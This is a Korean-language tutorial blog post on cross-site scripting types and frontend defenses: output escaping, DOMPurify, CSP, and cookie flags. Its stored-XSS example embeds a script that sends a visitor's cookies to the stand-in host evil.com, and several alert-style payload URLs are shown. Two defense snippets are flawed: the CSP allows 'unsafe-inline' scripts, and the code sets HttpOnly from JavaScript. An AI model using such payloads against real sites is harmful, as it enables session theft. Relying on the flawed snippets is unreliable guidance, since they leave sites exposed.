---
title: "XSS 공격과 프론트엔드 방어 전략"
shortTitle: "XSS 방어"
date: "2026-04-08"
tags: ["xss", "web-security", "frontend-security", "dom-manipulation", "csp"]
category: "Security"
summary: "XSS 공격의 유형과 프론트엔드에서 사용할 수 있는 방어 기법을 설명합니다"
author: "신중선"
source: "maeil-mail"
sourceUrl: "https://www.maeil-mail.kr/question/280"
references: ["https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss", "https://owasp.org/www-community/attacks/xss/", "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"]
---

## XSS 공격이란?

XSS(Cross-Site Scripting)는 공격자가 신뢰할 수 있는 웹사이트에 악성 스크립트를 삽입하여 사용자 브라우저에서 실행되게 하는 공격입니다. 이를 통해 쿠키 탈취, 세션 하이재킹, 사용자 정보 수집, 피싱 공격 등이 가능합니다.

XSS 공격의 가장 큰 위험성은 신뢰할 수 있는 웹사이트의 컨텍스트에서 악성 코드가 실행되기 때문에, 사용자가 공격을 인지하기 어렵다는 점입니다. 브라우저는 해당 스크립트를 정상적인 웹사이트의 코드로 인식하여 실행하게 됩니다.

## 핵심 개념

### 1. XSS 공격 유형

XSS 공격은 크게 세 가지 유형으로 분류됩니다:

**저장형(Stored) XSS**는 악성 스크립트가 서버 데이터베이스에 저장되어 다른 사용자가 해당 페이지를 방문할 때마다 실행되는 공격입니다:

```html
<!-- 게시판 댓글에 저장된 악성 스크립트 -->
<div class="comment">
  안녕하세요! <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
</div>
```

**반사형(Reflected) XSS**는 URL 파라미터나 폼 데이터를 통해 전달된 악성 스크립트가 서버 응답에 포함되어 즉시 실행되는 공격입니다:

```javascript
// 검색 결과 페이지에서 검색어를 그대로 출력할 때
const searchQuery = new URLSearchParams(location.search).get('q');
document.getElementById('result').innerHTML = `검색어: ${searchQuery}`;
// URL: example.com/search?q=<script>alert('XSS')</script>
```

**DOM 기반 XSS**는 클라이언트 측 JavaScript가 DOM을 동적으로 조작할 때 발생하는 공격입니다:

```javascript
// 해시값을 직접 DOM에 삽입
const hash = location.hash.substring(1);
document.getElementById('content').innerHTML = hash;
// URL: example.com#<img src=x onerror=alert('XSS')>
```

### 2. 입력 검증과 출력 이스케이핑

사용자 입력을 적절히 검증하고 HTML 출력 시 특수 문자를 이스케이프 처리하는 것이 기본적인 방어 방법입니다:

```javascript
// ❌ 위험한 방법 - 사용자 입력을 직접 HTML에 삽입
function displayUserContent(userInput) {
  document.getElementById('content').innerHTML = userInput;
}

// ✅ 안전한 방법 - textContent 사용으로 자동 이스케이프
function displayUserContent(userInput) {
  document.getElementById('content').textContent = userInput;
}

// ✅ HTML이 필요한 경우 - DOMPurify로 sanitization
import DOMPurify from 'dompurify';

function displayUserContent(userInput) {
  const cleanHTML = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: []
  });
  document.getElementById('content').innerHTML = cleanHTML;
}
```

### 3. Content Security Policy (CSP)

CSP는 브라우저에게 실행을 허용할 리소스의 출처를 명시적으로 지정하는 보안 정책입니다:

```html
<!-- 메타 태그로 CSP 설정 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline' https://trusted-cdn.com;
               style-src 'self' 'unsafe-inline';
               img-src 'self' data: https:;">
```

```javascript
// HTTP 헤더로 CSP 설정 (Express.js 예시)
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; script-src 'self' 'nonce-" + res.locals.nonce + "'");
  next();
});
```

### 4. 쿠키 보안 설정

쿠키에 적절한 보안 플래그를 설정하여 XSS 공격으로부터 세션을 보호할 수 있습니다:

```javascript
// HttpOnly 플래그로 JavaScript 접근 차단
document.cookie = "sessionId=abc123; HttpOnly; Secure; SameSite=Strict";

// 서버 사이드에서 쿠키 설정 (Express.js 예시)
app.use(session({
  cookie: {
    httpOnly: true,    // JavaScript 접근 차단
    secure: true,      // HTTPS에서만 전송
    sameSite: 'strict' // CSRF 공격 방지
  }
}));
```

## 정리

| 방어 기법 | 설명 | 적용 시점 |
|----------|------|----------|
| **입력 검증** | 사용자 입력의 형식과 내용을 검증 | 클라이언트/서버 |
| **출력 이스케이핑** | HTML 특수문자를 안전한 문자로 변환 | 출력 시점 |
| **CSP 설정** | 허용된 리소스 출처만 실행 허용 | 페이지 로드 시 |
| **HttpOnly 쿠키** | JavaScript를 통한 쿠키 접근 차단 | 쿠키 설정 시 |
| **Sanitization** | 신뢰할 수 없는 HTML 콘텐츠 정화 | HTML 삽입 전 |

XSS 방어는 단일 기법보다는 여러 보안 계층을 조합한 심층 방어(Defense in Depth) 전략이 효과적입니다. 사용자 입력 처리, 출력 이스케이핑, CSP 설정, 쿠키 보안을 모두 적용하여 종합적인 보안을 구축해야 합니다.